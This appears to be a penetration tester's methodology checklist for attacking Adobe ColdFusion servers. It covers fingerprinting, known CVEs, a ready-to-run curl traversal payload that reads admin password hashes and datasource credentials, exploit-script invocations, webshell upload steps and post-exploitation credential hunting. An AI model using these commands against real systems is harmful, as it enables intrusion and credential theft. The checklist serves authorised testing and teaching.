# Adobe ColdFusion Methodology

## 1. Discovery & Fingerprinting

- [ ] File extensions: `.cfm`, `.cfc` (ColdFusion Markup/Component)
- [ ] HTTP headers: `Server: ColdFusion`, `X-Powered-By: ColdFusion`
- [ ] Default admin login: `/CFIDE/administrator/`
- [ ] Error messages mentioning ColdFusion/CFML
- [ ] Default files: `admin.cfm`, `/CFIDE/administrator/enter.cfm`
- [ ] Common ports: 80, 443, 8500 (built-in web server), 1935 (RPC), 5500 (Server Monitor), 25 (SMTP)
- [ ] Nmap:
```bash
nmap -sV -p 80,443,8500,1935,5500 TARGET
```

---

## 2. Version Detection

- [ ] `/CFIDE/administrator/` — login page shows version
- [ ] Error pages often reveal version info
- [ ] HTTP response headers
- [ ] `searchsploit coldfusion` — list known exploits by version

---

## 3. Known CVEs

| CVE | Type | Auth | Versions |
|-----|------|------|----------|
| CVE-2010-2861 | Directory Traversal / Arbitrary File Read | No | Multiple |
| CVE-2013-0629 | Directory Traversal | No | 9.0, 9.0.1, 9.0.2 |
| CVE-2013-0632 | RCE (admin access via auth bypass) | No | 10 |
| CVE-2018-15961 | Arbitrary File Upload → RCE | No | 2018 (July update) |
| CVE-2023-26360 | Pre-auth RCE (deserialization) | No | 2018, 2021 |

---

## 4. Directory Traversal — CVE-2010-2861

> Read arbitrary files from the server via locale parameter

### Vulnerable Endpoints
```
/CFIDE/administrator/settings/mappings.cfm?locale=
/CFIDE/administrator/enter.cfm?locale=
/CFIDE/administrator/logging/settings.cfm?locale=
/CFIDE/administrator/datasources/index.cfm?locale=
```

### Exploitation
```bash
# Read password.properties (contains admin hash)
curl -s "http://TARGET:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en"

# Using searchsploit exploit
searchsploit -p 14641
python2 14641.py TARGET 8500 /CFIDE/administrator/enter.cfm "../../../../../../../lib/password.properties%00en"
```

### What to Read
- `lib/password.properties` — admin password hash
- `lib/seed.properties` — encryption seed
- `lib/neo-query.xml` — datasource credentials
- `lib/neo-datasource.xml` — database connection strings
- `/etc/passwd` (Linux) or `C:\Windows\win.ini` (Windows)
- `WEB-INF/web.xml` — deployment descriptor

---

## 5. Arbitrary File Upload — CVE-2018-15961

- [ ] Unauthenticated file upload via CKEditor integration
- [ ] Upload `.jsp` webshell directly
- [ ] Leads to RCE

---

## 6. Pre-Auth RCE — CVE-2023-26360

- [ ] Affects ColdFusion 2018 Update 15 and earlier, 2021 Update 5 and earlier
- [ ] Deserialization vulnerability
- [ ] Direct RCE without authentication

---

## 7. Unauthenticated RCE — Exploit Chain

```bash
# Search for RCE exploit
searchsploit -p 50057

# Modify exploit script — update execute_payload() function
# Run exploit
python3 50057.py http://TARGET:8500
```

---

## 8. Post-Exploitation

- [ ] ColdFusion admin password hash in `lib/password.properties`
- [ ] Datasource credentials in XML configs
- [ ] ColdFusion often runs as SYSTEM (Windows) or root (Linux)
- [ ] `lib/neo-query.xml` — database connection strings with passwords
- [ ] Check scheduled tasks for credentials
- [ ] Application `.cfm` files may contain hardcoded credentials

---

## 9. Decision Tree

```
ColdFusion Found (80/443/8500)
├── Version? (/CFIDE/administrator/, error pages)
├── CVE-2010-2861 → Directory traversal → read password.properties
│   └── Crack hash → admin login → RCE via admin panel
├── CVE-2018-15961 → Unauthenticated file upload → webshell
├── CVE-2023-26360 → Pre-auth RCE (deserialization)
├── CVE-2013-0632 → Auth bypass → admin → RCE
└── Post-exploit: datasource creds, runs as SYSTEM/root
```
